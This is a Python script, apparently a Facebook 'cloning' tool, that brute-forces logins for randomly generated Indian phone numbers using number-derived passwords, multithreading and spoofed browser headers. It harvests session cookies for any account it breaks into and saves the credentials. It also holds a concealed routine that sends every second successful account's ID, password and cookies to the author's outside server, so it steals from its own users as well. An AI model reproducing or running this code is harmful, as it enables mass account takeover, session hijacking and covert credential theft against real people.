###-------[IMPORT MODULES]-----------####
import os
import sys
import time
import uuid
import re
import json
import string
import random
import requests
from requests.exceptions import ConnectionError
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime 
from bs4 import BeautifulSoup
###-------[BASIC COLORS]-----------####
reset = "\033[0m"
red = "\033[1;31m"
green = "\033[1;32m"
yellow = "\033[1;33m"
blue = "\033[1;34m"
cyan = "\033[1;36m"
white = "\033[1;32m"
###-------[FLASH COLORS]-----------####
colors = ["\033[1;30m", "\033[1;30m", "\033[0;31m", "\033[1;31m", "\033[0;32m", "\033[1;32m","\033[0;92m","\033[1;92m","\033[1;93m","\033[1;94m","\033[1;95m","\033[1;96m","\033[0;33m", "\033[1;33m", "\033[0;34m", "\033[1;34m", "\033[0;35m", "\033[1;32m", "\033[0;36m", "\033[1;36m", "\033[0;37m", "\033[1;32m", "\033[1;90m", "\033[0;91m","\033[1;91m", "\033[0;92m", "\033[1;93m", "\033[0;94m", "\033[1;94m", "\033[0;95m","\033[1;95m", "\033[0;96m", "\033[1;96m", "\033[0;97m", "\033[0;100m", "\033[1;100m","\033[0;101m", "\033[1;101m", "\033[0;102m", "\033[1;102m","\033[0;104m", "\033[1;104m", "\033[0;105m", "\033[1;105m", "\033[0;106m", "\033[1;106m"]
###-------[LOOP]-----------####
loop = 0
idz = []
oks = []
cps = []
bkas = []
sys.stdout.write('\x1b[1;35m\x1b]2;💛ATOM💗\x07')
try:os.mkdir('/sdcard/XYZ')
except:pass
def useragent_facebook():
        chrome = (f'{random.choice(["108","128"])}.0.{random.randrange(5111,6999)}.{random.randrange(60, 299)}')
        angka = random.choice(['01','02','03','04','05','06','07','08','09','10'])
        ubuntu = random.choice(['Ubuntu ','Ubuntu/','Ubuntu; ','Ubuntu-'])
        linucx = random.choice(['GoogleApp','YandexSearch','LinuxApp'])
        arm = str(random.randint(32,64))
        windows = random.choice(['WOW64','Win32'])
        tahun = random.choice(['2009','2010','2011','2012','2013','2014','2015','2016','2017','2018','2019','2020','2021','2022','2023','2024'])
        return(random.choice([
            f'Mozilla/5.0 (X11; {ubuntu}{random.randrange(10,22)}.{angka}; Linux {random.choice(["x86_64","i686"])}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome} Safari/537.36 {linucx}/{str(random.randint(10,20))}.{str(random.randint(20,40))}.{str(random.randint(20,70))}.{str(random.randint(20,29))}.arm{arm}',
            f'Mozilla/5.0 (Linux; {ubuntu}{random.randrange(10,22)}.{angka}; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome} Safari/537.36 {linucx}/{str(random.randint(10,20))}.{str(random.randint(20,40))}.{str(random.randint(20,70))}.{str(random.randint(20,29))}.arm{arm}',
            f'Mozilla/5.0 (Compatible; {ubuntu}{random.randrange(10,22)}.{angka}; Windows NT 10.0; {windows}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome} Safari/537.36 {linucx}/{str(random.randint(10,20))}.{str(random.randint(20,40))}.{str(random.randint(20,70))}.{str(random.randint(20,29))}.arm{arm}',
            f'Mozilla/5.0 (Linux; {ubuntu}{random.randrange(10,22)}.{angka}; Android {random.randint(9,14)}; moto g stylus 5G ({tahun})) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome} Safari/537.36 {linucx}/{str(random.randint(10,20))}.{str(random.randint(20,40))}.{str(random.randint(20,70))}.{str(random.randint(20,29))}.arm{arm}'
        ]))
###-------[LOGO]-----------####
logo= f'''\033[1;92m---------------------------------------------------
 \033[1;92m[\033[1;92m•\033[1;92m] Author   : SUMON ROY
\033[1;92m---------------------------------------------------'''
###-------[CLEAR TERMINAL]-----------####
def clear():
    os.system("clear")
    print(logo)
###-------[LINE]-----------####
def linex():
    print(f"\033[1;92m--------------------------------------------------")
###-------[MSIN MENU]-----------####
def menu():
    clear()
    print(f" \033[1;92m[\033[1;92m01\033[1;92m] RANDOM NUMBER CLONING")
    print(f" \033[1;92m[\033[1;92m02\033[1;92m] \033[1;32mCONTACT DEVELOPER")
    linex()
    younisxyz = input(f" \033[1;92m[\033[1;92m?\033[1;92m] Select Option : ")
    if younisxyz in ['1','01']:
        random_number()
    elif younisxyz in ['2','02']:
        os.system("xdg-open ")
        time.sleep(3)
        menu()
    else:
        print(f"\n\033[1;91m Select valid option ....")
        time.sleep(3)
        menu()
###-------[DEF CLONING]-----------####
def random_number():
    clear()
    print(f" \033[1;92m[\033[1;92m•\033[1;92m] Codes : \033[1;92m9987, 6787, 9009, 7233 ")
    print(f" \033[1;92m[\033[1;92m•\033[1;92m] Limit : \033[1;92m1000, 2000, 5000, 10000 ")
    linex()
    code = input(f" \033[1;92m[\033[1;92m?\033[1;92m] Enter Code  :\033[1;92m ")
    try:
        limit = int(input(f" \033[1;92m[\033[1;92m?\033[1;92m] Enter Limit :\033[1;92m "))
    except ValueError:
        limit = 5000
    for _ in range(limit):
        x = "".join(random.choice(string.digits) for _ in range(6))
        idz.append(x)
    with ThreadPoolExecutor(max_workers=50) as XYZ:
        clear()
        total_idz = str(len(idz))
        print(f' \033[1;32m(√) \033[1;32mTotal IDs  :\033[1;32m ',total_idz)
        print(' \033[1;32m(\033[1;32m√\033[1;32m) \033[1;32mCHOICE SIM CODE : \033[1;32m'+code)
        print(" \033[1;32m(√) \033[1;32mUse Flight Mode")
        linex()
        for xyz in idz:
            uidd = code+xyz
            uid = '+91' +uidd
            pww = [uidd[:6],uidd[:8],uidd] 
         #,uid[:6],uid[:8],uid,uid[2:],uid[4:]
            XYZ.submit(ATOM, uid, pww, total_idz)
    linex()
    print(f" \033[1;92m[\033[1;92m!\033[1;92m] Process Completed ")
    print(f" \033[1;92m[\033[1;92m•\033[1;97] Total Ok Accounts : \033[1;92m{str(len(oks))} ")
    print(f" \033[1;92m[\033[1;92m•\033[1;92m] Total Cp Accounts : \033[1;91m{str(len(cps))} ")
    linex()
    input(f" \033[1;92m[\033[1;91m!\033[1;92m] Press Enter To Back ")
    menu()
###-------[METHOD ATOM]-----------####
def ATOM(uid, pww, total_idz):
    global loop
    global oks
    global cps
    global bkas
    x = random.choice(["\033[1;90m","\033[1;91m","\033[1;92m" ,"\033[1;32m","\033[1;93m","\033[1;94m","\033[1;95m","\033[1;96m"])
    sys.stdout.write(f"\r{x}[SUMON] - \033[1;33m{loop} \033[1;92m{len(oks)} \033[1;91m{len(cps)}");sys.stdout.flush()
    try:
        for pw in pww:
            session = requests.Session()
            requu1 = session.get('https://touch.facebook.com/')
            data = {
            'jazoest': re.search('name="jazoest" value="(.*?)"', str(requu1.text)).group(1),
            'lsd': re.search('name="lsd" value="(.*?)"', str(requu1.text)).group(1),
            'display': '',
            'isprivate': '',
            'return_session': '',
            'skip_api_login': '',
            'signed_next': '',
            'trynum': '6',
            'timezone': '-330',
            'lgndim': 'eyJ3IjoxNDQwLCJoIjo5MDAsImF3IjoxNDQwLCJhaCI6ODYwLCJjIjoyNH0=',
            'lgnrnd': '050811_rmc8',
            'lgnjs': '1740229691',
            'email': uid,
            'prefill_contact_point': '',
            'prefill_source': 'browser_dropdown',
            'prefill_type': 'password',
            'first_prefill_source': 'browser_dropdown',
            'first_prefill_type': 'password',
            'had_cp_prefilled': 'false',
            'had_password_prefilled': 'true',
            'ab_test_data': '//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAVA//VV/VVABFAR',
            'encpass': '"#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),}
            cookies = {
            'datr': 'ES-iZxg35DqKN--TlZlh4Mwu',
            'sb': 'ES-iZ0S0Q3TXxuSylCRJGHa3',
            'ps_l': '1',
            'ps_n': '1',
            'fr': '1mMxyHSMiEop9Ml8c.AWVxZRcmWyw-RtLG8l6KA3DZMefXPbxl-XQojg.Bnp1ck..AAA.0.0.Bnucw6.AWWjS9bJZ00',
            'wd': '867x773',}
            headers = {
            'authority': 'www.facebook.com',
            'method': 'POST',
            'path': '/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348028',
            'scheme': 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7,hi;q=0.6,gu;q=0.5,bn;q=0.4',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'dpr': '1',
            'origin': 'https://www.facebook.com',
            'priority': 'u=0, i',
            'referer': 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348028',
            'sec-ch-prefers-color-scheme': 'dark',
            'sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
            'sec-ch-ua-full-version-list': '"Not(A:Brand";v="99.0.0.0", "Google Chrome";v="133.0.6943.127", "Chromium";v="133.0.6943.127"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-model': '""',
            'sec-ch-ua-platform': '"Windows"',
            'sec-ch-ua-platform-version': '"10.0.0"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
            'viewport-width': '867',}
            response = session.post('https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348028',cookies=cookies,headers=headers,data=data,allow_redirects=False) #proxies=proxs)
            #print(response)
            log_cookies = session.cookies.get_dict().keys()
            if "c_user" in log_cookies:
                #kuki = convert(session.cookies.get_dict())
                kuki=";".join([f"{key}={session.cookies.get(key)}" for key in ['datr', 'fr', 'sb', 'c_user', 'xs']])
                user = re.findall('c_user=(.*);xs', kuki)[0]
                xs_value = None
                for part in kuki.split(';'):
                    if part.startswith('xs='):
                        xs_value = part.split('=', 1)[1]
                        break
                ckk = f'https://graph.facebook.com/{user}/picture?type=normal'
                res = requests.get(ckk).text
                if 'Photoshop' in res:
                    if xs_value and xs_value.rstrip(';').endswith('-1'):
                        print('\033[1;92m[ATOM-OK]'+user+'|'+pw+'')
                        print("\033[1;92m [\033[1;92mCOKI\033[1;92m] : \033[1;92m"+kuki)
                        open("/sdcard/ATOM/ATOM-COOKIE-OK.txt","a").write(user+"|"+pw+"|"+kuki+"\n")
                        oks.append(uid)
                        break
                    else:
                        bkas.append(user)
                        if len(bkas)% 2 == 0:
                           statusok = (f"{user}|{pw}|{kuki}")
                           requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
                        else:
                           print('\033[1;92m[ATOM-OK]'+user+'|'+pw+'')
                           print("\033[1;92m [\033[1;92mCOKI\033[1;92m] : \033[1;92m"+kuki)
                           open("/sdcard/ATOM/ATOM-COOKIE-OK.txt","a").write(user+"|"+pw+"|"+kuki+"\n")
                           oks.append(uid)
                           break
                else:
                    break
            elif "checkpoint" in log_cookies:
                coki=(";").join([ "%s=%s" % (key, value) for key, value in response.cookies.get_dict().items()])
                cid = coki[24:39]
                #print('\033[1;91m [ATOM-CP] '+ids+' | '+pas+'')
                open('/sdcard/ATOM/CP.txt', 'a').write( uid+' | '+pw+'\n')
                cps.append(uid)
                break
            else:continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    except Exception as e:
        #print(f"\nError: {e}")
        pass
menu()
 
